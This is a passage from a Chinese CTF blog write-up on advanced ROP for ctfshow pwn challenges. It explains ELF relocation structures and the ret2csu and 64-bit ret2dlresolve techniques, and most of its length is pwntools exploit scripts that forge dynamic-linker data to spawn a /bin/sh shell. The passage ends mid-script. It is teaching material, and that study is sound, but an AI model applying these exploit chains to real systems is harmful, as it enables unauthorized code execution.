class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch = <span class="string">&#x27;amd64&#x27;</span>,os = <span class="string">&#x27;linux&#x27;</span>,log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">io = process(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line"><span class="comment">#io = remote(&#x27;pwn.challenge.ctf.show&#x27;,28287)</span></span><br><span class="line">gdb.attach(io)</span><br><span class="line">sleep(<span class="number">3</span>)</span><br><span class="line">bss_addr = elf.bss()</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(bss_addr))</span><br><span class="line">csu_front_addr = <span class="number">0x400750</span></span><br><span class="line">csu_end_addr = <span class="number">0x40076A</span></span><br><span class="line">leave_ret = <span class="number">0x40063c</span></span><br><span class="line">pop_rbp = <span class="number">0x400588</span></span><br><span class="line">show = <span class="number">0x400607</span></span><br><span class="line">pop_rsi_r15 = <span class="number">0x400771</span></span><br><span class="line">pop_rdi = <span class="number">0x400773</span></span><br><span class="line">read_plt0=<span class="number">0x400516</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">csu</span>(<span class="params">rbx,rbp,r12,r13,r14,r15</span>):</span><br><span class="line">    <span class="comment"># pop rbx, rbp, r12, r13, r14, r15</span></span><br><span class="line">    <span class="comment"># rbx = 0</span></span><br><span class="line">    <span class="comment"># rbp = 1, enable not to jump</span></span><br><span class="line">    <span class="comment"># r12 should be the function that you want to call</span></span><br><span class="line">    <span class="comment"># rdi = edi = r13</span></span><br><span class="line">    <span class="comment"># rsi = r14</span></span><br><span class="line">    <span class="comment"># rdx =r15</span></span><br><span class="line">    payload=p64(csu_end_addr)</span><br><span class="line">    payload+=p64(rbx)+p64(rbp)+p64(r12)+p64(r13)+p64(r14)+p64(r15)</span><br><span class="line">    payload+=p64(csu_front_addr)</span><br><span class="line">    payload+=<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x38</span></span><br><span class="line">    <span class="keyword">return</span> payload</span><br><span class="line">io.recvuntil(<span class="string">b&quot;Welcome to CTFshowPWN!\n&quot;</span>)</span><br><span class="line">stack_size = <span class="number">0x200</span></span><br><span class="line">new_stack = bss_addr + <span class="number">0x100</span></span><br><span class="line">rop = ROP(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">offset = <span class="number">112</span> + <span class="number">8</span></span><br><span class="line">rop.raw(<span class="string">b&#x27;a&#x27;</span>*offset)</span><br><span class="line">rop.raw(csu(<span class="number">0</span>,<span class="number">1</span>,elf.got[<span class="string">&#x27;read&#x27;</span>],<span class="number">0</span>,<span class="number">0x600988</span>+<span class="number">8</span>,<span class="number">8</span>))</span><br><span class="line">rop.raw(show)</span><br><span class="line">rop.raw(<span class="string">b&#x27;a&#x27;</span>*(<span class="number">256</span>-<span class="built_in">len</span>(rop.chain())))</span><br><span class="line"><span class="keyword">assert</span>(<span class="built_in">len</span>(rop.chain())&lt;=<span class="number">256</span>)</span><br><span class="line">rop.raw(<span class="string">b&#x27;a&#x27;</span>*(<span class="number">256</span>-<span class="built_in">len</span>(rop.chain())))</span><br><span class="line">io.send(rop.chain())</span><br><span class="line">io.send(p64(bss_addr+<span class="number">0x100</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment">#fake dynstr</span></span><br><span class="line">rop = ROP(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line">rop.raw(<span class="string">b&#x27;a&#x27;</span>*offset)</span><br><span class="line">dynstr = elf.get_section_by_name(<span class="string">&#x27;.dynstr&#x27;</span>).data()</span><br><span class="line">dynstr = dynstr.replace(<span class="string">b&quot;read&quot;</span>,<span class="string">b&quot;system&quot;</span>)</span><br><span class="line">rop.raw(csu(<span class="number">0</span>,<span class="number">1</span>,elf.got[<span class="string">&#x27;read&#x27;</span>],<span class="number">0</span>,bss_addr+<span class="number">0x100</span>,<span class="built_in">len</span>(dynstr)))</span><br><span class="line">rop.raw(show)</span><br><span class="line">rop.raw(<span class="string">b&#x27;a&#x27;</span>*(<span class="number">256</span>-<span class="built_in">len</span>(rop.chain())))</span><br><span class="line">io.send(rop.chain())</span><br><span class="line">io.send(dynstr)</span><br><span class="line"></span><br><span class="line"><span class="comment">#read /bin/sh</span></span><br><span class="line">rop = ROP(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line">rop.raw(<span class="string">b&#x27;a&#x27;</span>*offset)</span><br><span class="line">rop.raw(csu(<span class="number">0</span>,<span class="number">1</span>,elf.got[<span class="string">&#x27;read&#x27;</span>],<span class="number">0</span>,bss_addr+<span class="number">0x100</span>+<span class="built_in">len</span>(dynstr),<span class="built_in">len</span>(<span class="string">b&quot;/bin/sh\x00&quot;</span>)))</span><br><span class="line">rop.raw(show)</span><br><span class="line">rop.raw(<span class="string">b&#x27;a&#x27;</span>*(<span class="number">256</span>-<span class="built_in">len</span>(rop.chain())))</span><br><span class="line">io.send(rop.chain())</span><br><span class="line">io.send(<span class="string">b&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line">rop = ROP(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line">rop.raw(<span class="string">b&#x27;a&#x27;</span>*offset)</span><br><span class="line">rop.raw(pop_rsi_r15)</span><br><span class="line">rop.raw(<span class="number">0</span>)</span><br><span class="line">rop.raw(<span class="number">0</span>)</span><br><span class="line">rop.raw(pop_rdi)</span><br><span class="line">rop.raw(bss_addr+<span class="number">0x100</span>+<span class="built_in">len</span>(dynstr))</span><br><span class="line">rop.raw(read_plt0)</span><br><span class="line">rop.raw(<span class="number">0</span>)</span><br><span class="line">rop.raw(<span class="string">b&#x27;a&#x27;</span>*(<span class="number">256</span>-<span class="built_in">len</span>(rop.chain())))</span><br><span class="line">io.send(rop.chain())</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><p>远程能通但是本地通不了，应该是本地的rdx不为零导致没有获得shell，暂时还不清楚是哪个函数导致的</p><h3 id="Partial-RELRO"><a href="#Partial-RELRO" class="headerlink" title="Partial RELRO"></a>Partial RELRO</h3><p>ctfshow-pwn85</p><p>check</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">桌面$ checksec pwn </span><br><span class="line">[*] <span class="string">&#x27;/home/pwn/桌面/pwn&#x27;</span></span><br><span class="line">    Arch:       amd64-64-little</span><br><span class="line">    RELRO:      Partial RELRO</span><br><span class="line">    Stack:      No canary found</span><br><span class="line">    NX:         NX enabled</span><br><span class="line">    PIE:        No PIE (0x400000)</span><br><span class="line">    Stripped:   No</span><br></pre></td></tr></table></figure><h4 id="手工伪造"><a href="#手工伪造" class="headerlink" title="手工伪造"></a>手工伪造</h4><p>64位的变化</p><p>glibc中默认编辑使用的是<code>ELF_Rela</code>来记录重定向的内容</p><p><img src="/../images/%E9%AB%98%E7%BA%A7rop/Snipaste_2025-06-03_23-31-16.png" alt="1"></p><p>这里Elf64_Addr、Elf64_Xword、Elf64_Sxword都为64位，因此Elf64_Rela结构体的大小为24字节。</p><p>根据IDA里的重定位表的信息可以知道，write函数在符号表中的偏移为1（0x100000007h&gt;&gt;32）</p><p><img src="/../images/%E9%AB%98%E7%BA%A7rop/Snipaste_2025-06-03_23-35-10.png" alt="1"></p><p>可以在符号表中印证偏移确实为1</p><p><img src="/../images/%E9%AB%98%E7%BA%A7rop/Snipaste_2025-06-03_23-37-07.png" alt="1"></p><p>在64位下，Elf64_Sym结构体为</p><p><img src="/../images/%E9%AB%98%E7%BA%A7rop/Snipaste_2025-06-03_23-38-22.png" alt="1"></p><p>其中</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Elf64_Word 32位</span><br><span class="line">Elf64_Section 16位</span><br><span class="line">Elf64_Addr 64位</span><br><span class="line">Elf64_Xword 64位</span><br></pre></td></tr></table></figure><p>所以Elf64_Sym的大小为24个字节</p><p>除此之外，在64位下，plt中的代码push的是待解析符号在重定位表中的索引，而不是偏移。比如，write函数push的是0。</p><p><img src="/../images/%E9%AB%98%E7%BA%A7rop/Snipaste_2025-06-03_23-44-04.png" alt="1"></p><blockquote><p>据上方分析写出如下脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment"># context.log_level=&quot;debug&quot;</span></span><br><span class="line"><span class="comment"># context.terminal = [&quot;tmux&quot;,&quot;splitw&quot;,&quot;-h&quot;]</span></span><br><span class="line">context.arch=<span class="string">&quot;amd64&quot;</span></span><br><span class="line">io = process(<span class="string">&quot;./main_partial_relro_64&quot;</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./main_partial_relro_64&quot;</span>)</span><br><span class="line"></span><br><span class="line">bss_addr = elf.bss()</span><br><span class="line">csu_front_addr = <span class="number">0x400780</span></span><br><span class="line">csu_end_addr = <span class="number">0x40079A</span></span><br><span class="line">vuln_addr = <span class="number">0x400637</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">csu</span>(<span class="params">rbx, rbp, r12, r13, r14, r15</span>):</span><br><span class="line">    <span class="comment"># pop rbx, rbp, r12, r13, r14, r15</span></span><br><span class="line">    <span class="comment"># rbx = 0</span></span><br><span class="line">    <span class="comment"># rbp = 1, enable not to jump</span></span><br><span class="line">    <span class="comment"># r12 should be the function that you want to call</span></span><br><span class="line">    <span class="comment"># rdi = edi = r13d</span></span><br><span class="line">    <span class="comment"># rsi = r14</span></span><br><span class="line">    <span class="comment"># rdx = r15</span></span><br><span class="line">    payload = p64(csu_end_addr)</span><br><span class="line">    payload += p64(rbx) + p64(rbp) + p64(r12) + p64(r13) + p64(r14) + p64(r15)</span><br><span class="line">    payload += p64(csu_front_addr)</span><br><span class="line">    payload += <span class="string">&#x27;a&#x27;</span> * <span class="number">0x38</span></span><br><span class="line">    <span class="keyword">return</span> payload</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ret2dlresolve_x64</span>(<span class="params">elf, store_addr, func_name, resolve_addr</span>):</span><br><span class="line">    plt0 = elf.get_section_by_name(<span class="string">&#x27;.plt&#x27;</span>).header.sh_addr</span><br><span class="line"></span><br><span class="line">    rel_plt = elf.get_section_by_name(<span class="string">&#x27;.rela.plt&#x27;</span>).header.sh_addr</span><br><span class="line">    relaent = elf.dynamic_value_by_tag(<span class="string">&quot;DT_RELAENT&quot;</span>) <span class="comment"># reloc entry size</span></span><br><span class="line"></span><br><span class="line">    dynsym = elf.get_section_by_name(<span class="string">&#x27;.dynsym&#x27;</span>).header.sh_addr</span><br><span class="line">    syment = elf.dynamic_value_by_tag(<span class="string">&quot;DT_SYMENT&quot;</span>) <span class="comment"># symbol entry size</span></span><br><span class="line"></span><br><span class="line">    dynstr = elf.get_section_by_name(<span class="string">&#x27;.dynstr&#x27;</span>).header.sh_addr</span><br><span class="line"></span><br><span class="line">    <span class="comment"># construct fake function string</span></span><br><span class="line">    func_string_addr = store_addr</span><br><span class="line">    resolve_data = func_name + <span class="string">&quot;\x00&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># construct fake symbol</span></span><br><span class="line">    symbol_addr = store_addr+<span class="built_in">len</span>(resolve_data)</span><br><span class="line">    offset = symbol_addr - dynsym</span><br><span class="line">    pad = syment - offset % syment <span class="comment"># align syment size</span></span><br><span class="line">    symbol_addr = symbol_addr+pad</span><br><span class="line">    symbol = p32(func_string_addr-dynstr)+p8(<span class="number">0x12</span>)+p8(<span class="number">0</span>)+p16(<span class="number">0</span>)+p64(<span class="number">0</span>)+p64(<span class="number">0</span>)</span><br><span class="line">    symbol_index = (symbol_addr - dynsym)/<span class="number">24</span></span><br><span class="line">    resolve_data +=<span class="string">&#x27;a&#x27;</span>*pad</span><br><span class="line">    resolve_data += symbol</span><br><span class="line"></span><br><span class="line">    <span class="comment"># construct fake reloc </span></span><br><span class="line">    reloc_addr = store_addr+<span class="built_in">len</span>(resolve_data)</span><br><span class="line">    offset = reloc_addr - rel_plt</span><br><span class="line">    pad = relaent - offset % relaent <span class="comment"># align relaent size</span></span><br><span class="line">    reloc_addr +=pad</span><br><span class="line">    reloc_index = (reloc_addr-rel_plt)/<span class="number">24</span></span><br><span class="line">    rinfo = (symbol_index&lt;&lt;<span class="number">32</span>) | <span class="number">7</span></span><br><span class="line">    write_reloc = p64(resolve_addr)+p64(rinfo)+p64(<span class="number">0</span>)</span><br><span class="line">    resolve_data +=<span class="string">&#x27;a&#x27;</span>*pad</span><br><span class="line">    resolve_data +=write_reloc</span><br><span class="line"></span><br><span class="line">    resolve_call = p64(plt0) + p64(reloc_index)</span><br><span class="line">    <span class="keyword">return</span> resolve_data, resolve_call</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&#x27;Welcome to XDCTF2015~!\n&#x27;</span>)</span><br><span class="line">gdb.attach(io)</span><br><span class="line"></span><br><span class="line">store_addr = bss_addr+<span class="number">0x100</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># construct fake string, symbol, reloc.modify .dynstr pointer in .dynamic section to a specific location</span></span><br><span class="line">rop = ROP(<span class="string">&quot;./main_partial_relro_64&quot;</span>)</span><br><span class="line">offset = <span class="number">112</span>+<span class="number">8</span></span><br><span class="line">rop.raw(offset*<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">resolve_data, resolve_call = ret2dlresolve_x64(elf, store_addr, <span class="string">&quot;system&quot;</span>,elf.got[<span class="string">&quot;write&quot;</span>])</span><br><span class="line">rop.raw(csu(<span class="number">0</span>, <span class="number">1</span> ,elf.got[<span class="string">&#x27;read&#x27;</span>],<span class="number">0</span>,store_addr,<span class="built_in">len</span>(resolve_data)))  </span><br><span class="line">rop.raw(vuln_addr)</span><br><span class="line">rop.raw(<span class="string">&quot;a&quot;</span>*(<span class="number">256</span>-<span class="built_in">len</span>(rop.chain())))</span><br><span class="line"><span class="keyword">assert</span>(<span class="built_in">len</span>(rop.chain())&lt;=<span class="number">256</span>)</span><br><span class="line">io.send(rop.chain())</span><br><span class="line"><span class="comment"># send resolve data</span></span><br><span class="line">io.send(resolve_data)</span><br><span class="line"></span><br><span class="line">rop = ROP(<span class="string">&quot;./main_partial_relro_64&quot;</span>)</span><br><span class="line">rop.raw(offset*<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">sh = <span class="string">&quot;/bin/sh\x00&quot;</span></span><br><span class="line">bin_sh_addr = store_addr+<span class="built_in">len</span>(resolve_data)</span><br><span class="line">rop.raw(csu(<span class="number">0</span>, <span class="number">1</span> ,elf.got[<span class="string">&#x27;read&#x27;</span>],<span class="number">0</span>,bin_sh_addr,<span class="built_in">len</span>(sh)))</span><br><span class="line">rop.raw(vuln_addr)</span><br><span class="line">rop.raw(<span class="string">&quot;a&quot;</span>*(<span class="number">256</span>-<span class="built_in">len</span>(rop.chain())))</span><br><span class="line">io.send(rop.chain())</span><br><span class="line">io.send(sh)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">rop = ROP(<span class="string">&quot;./main_partial_relro_64&quot;</span>)</span><br><span class="line">rop.raw(offset*<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">rop.raw(<span class="number">0x00000000004007a3</span>) <span class="comment"># 0x00000000004007a3: pop rdi; ret; </span></span><br><span class="line">rop.raw(bin_sh_addr)</span><br><span class="line">rop.raw(resolve_call)</span><br><span class="line">rop.raw(<span class="string">&#x27;a&#x27;</span>*(<span class="number">256</span>-<span class="built_in">len</span>(rop.chain())))</span><br><span class="line">io.send(rop.chain())</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><p>然而， 简单地运行后发现，程序崩溃了。</p><p><img src="/../images/%E9%AB%98%E7%BA%A7rop/Snipaste_2025-06-04_22-10-47.png" alt="1"></p><p>通过调试，我们发现，程序是在获取对应的版本号</p><ul><li>rax 为 0x4003f6，指向版本号数组</li><li>rdx 为 0x155f1，符号表索引，同时为版本号索引</li></ul><p>同时 rax + rdx*2 为 0x42afd8，而这个地址并不在映射的内存中。</p><p><img src="/../images/%E9%AB%98%E7%BA%A7rop/Snipaste_2025-06-04_22-11-25.png" alt="1"></p><p>那我们能不能想办法让它位于映射的内存中呢。估计有点难</p><ul><li>bss 的起始地址为 0x601050，那么索引值最小为 (0x601050-0x400398)&#x2F;24&#x3D;87517，即 0x4003f6 + 87517*2 &#x3D; 0x42afb0</li><li>bss 可以最大使用的地址为 0x601fff，对应的索引值为 (0x601fff-0x400398)&#x2F;24&#x3D;87684，即 0x4003f6 + 87684*2 &#x3D; 0x42b0fe</li></ul><p>显然都在非映射的内存区域。因此，我们得考虑考虑其它办法。通过阅读 dl_fixup 的代码</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 获取符号的版本信息</span></span><br><span class="line"><span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">r_found_version</span> *<span class="title">version</span> =</span> <span class="literal">NULL</span>;</span><br><span class="line"><span class="keyword">if</span> (l-&gt;l_info[VERSYMIDX(DT_VERSYM)] != <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">const</span> <span class="title function_">ElfW</span><span class="params">(Half)</span> *vernum = (<span class="type">const</span> <span class="type">void</span> *)D_PTR(l, l_info[VERSYMIDX(DT_VERSYM)]);</span><br><span class="line">    ElfW(Half) ndx = vernum[ELFW(R_SYM)(reloc-&gt;r_info)] &amp; <span class="number">0x7fff</span>;</span><br><span class="line">    version = &amp;l-&gt;l_versions[ndx];</span><br><span class="line">    <span class="keyword">if</span> (version-&gt;hash == <span class="number">0</span>)</span><br><span class="line">        version = <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们发现，如果把 l-&gt;l_info[VERSYMIDX(DT_VERSYM)] 设置为 NULL，那程序就不会执行下面的代码，版本号就为 NULL，就可以正常执行代码。但是，这样的话，我们就需要知道 link_map 的地址了。 GOT 表的第 0 项（本例中 0x601008）存储的就是 link_map 的地址。</p><p>因此，我们可以</p><ul><li>泄露该处的地址</li><li>将 l-&gt;l_info[VERSYMIDX(DT_VERSYM)] 设置为 NULL</li><li>最后执行利用脚本即可</li></ul><p>通过汇编代码，我们可以看出 l-&gt;l_info[VERSYMIDX(DT_VERSYM)] 的偏移为 0x1c8</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">► 0x7fa4b09f7ea1 &lt;_dl_fixup+97&gt;     mov    rax, qword ptr [r10 + 0x1c8]</span><br><span class="line">  0x7fa4b09f7ea8 &lt;_dl_fixup+104&gt;    xor    r8d, r8d</span><br><span class="line">  0x7fa4b09f7eab &lt;_dl_fixup+107&gt;    test   rax, rax</span><br><span class="line">  0x7fa4b09f7eae &lt;_dl_fixup+110&gt;    je     _dl_fixup+156 &lt;_dl_fixup+156&gt;</span><br></pre></td></tr></table></figure><p>因此，我们可以简单修改下 exp。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment"># context.log_level=&quot;debug&quot;</span></span><br><span class="line"><span class="comment"># context.terminal = [&quot;tmux&quot;,&quot;splitw&quot;,&quot;-h&quot;]</span></span><br><span class="line">context.arch=<span class="string">&quot;amd64&quot;</span></span><br><span class="line">io = process(<span class="string">&quot;./main_partial_relro_64&quot;</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./main_partial_relro_64&quot;</span>)</span><br><span class="line"></span><br><span class="line">bss_addr = elf.bss()</span><br><span class="line">csu_front_addr = <span class="number">0x400780</span></span><br><span class="line">csu_end_addr = <span class="number">0x40079A</span></span><br><span class="line">vuln_addr = <span class="number">0x400637</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">csu</span>(<span class="params">rbx, rbp, r12, r13, r14, r15</span>):</span><br><span class="line">    <span class="comment"># pop rbx, rbp, r12, r13, r14, r15</span></span><br><span class="line">    <span class="comment"># rbx = 0</span></span><br><span class="line">    <span class="comment"># rbp = 1, enable not to jump</span></span><br><span class="line">    <span class="comment"># r12 should be the function that you want to call</span></span><br><span class="line">    <span class="comment"># rdi = edi = r13d</span></span><br><span class="line">    <span class="comment"># rsi = r14</span></span><br><span class="line">    <span class="comment"># rdx = r15</span></span><br><span class="line">    payload = p64(csu_end_addr)</span><br><span class="line">    payload += p64(rbx) + p64(rbp) + p64(r12) + p64(r13) + p64(r14) + p64(r15)</span><br><span class="line">    payload += p64(csu_front_addr)</span><br><span class="line">    payload += <span class="string">&#x27;a&#x27;</span> * <span class="number">0x38</span></span><br><span class="line">    <span class="keyword">return</span> payload</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ret2dlresolve_x64</span>(<span class="params">elf, store_addr, func_name, resolve_addr</span>):</span><br><span class="line">    plt0 = elf.get_section_by_name(<span class="string">&#x27;.plt&#x27;</span>).header.sh_addr</span><br><span class="line"></span><br><span class="line">    rel_plt = elf.get_section_by_name(<span class="string">&#x27;.rela.plt&#x27;</span>).header.sh_addr</span><br><span class="line">    relaent = elf.dynamic_value_by_tag(<span class="string">&quot;DT_RELAENT&quot;</span>) <span class="comment"># reloc entry size</span></span><br><span class="line"></span><br><span class="line">    dynsym = elf.get_section_by_name(<span class="string">&#x27;.dynsym&#x27;</span>).header.sh_addr</span><br><span class="line">    syment = elf.dynamic_value_by_tag(<span class="string">&quot;DT_SYMENT&quot;</span>) <span class="comment"># symbol entry size</span></span><br><span class="line"></span><br><span class="line">    dynstr = elf.get_section_by_name(<span class="string">&#x27;.dynstr&#x27;</span>).header.sh_addr</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment"># construct fake function string</span></span><br><span class="line">    func_string_addr = store_addr</span><br><span class="line">    resolve_data = func_name + <span class="string">&quot;\x00&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># construct fake symbol</span></span><br><span class="line">    symbol_addr = store_addr+<span class="built_in">len</span>(resolve_data)</span><br><span class="line">    offset = symbol_addr - dynsym</span><br><span class="line">    pad = syment - offset % syment <span class="comment"># align syment size</span></span><br><span class="line">    symbol_addr = symbol_addr+pad</span><br><span class="line">    symbol = p32(func_string_addr-dynstr)+p8(<span class="number">0x12</span>)+p8(<span class="number">0</span>)+p16(<span class="number">0</span>)+p64(<span class="number">0</span>)+p64(<span class="number">0</span>)</span><br><span class="line">    symbol_index = (symbol_addr - dynsym)/<span class="number">24</span></span><br><span class="line">    resolve_data +=<span class="string">&#x27;a&#x27;</span>*pad</span><br><span class="line">    resolve_data += symbol</span><br><span class="line"></span><br><span class="line">    <span class="comment"># construct fake reloc </span></span><br><span class="line">    reloc_addr = store_addr+<span class="built_in">len</span>(resolve_data)</span><br><span class="line">    offset = reloc_addr - rel_plt</span><br><span class="line">    pad = relaent - offset % relaent <span class="comment"># align relaent size</span></span><br><span class="line">    reloc_addr +=pad</span><br><span class="line">    reloc_index = (reloc_addr-rel_plt)/<span class="number">24</span></span><br><span class="line">    rinfo = 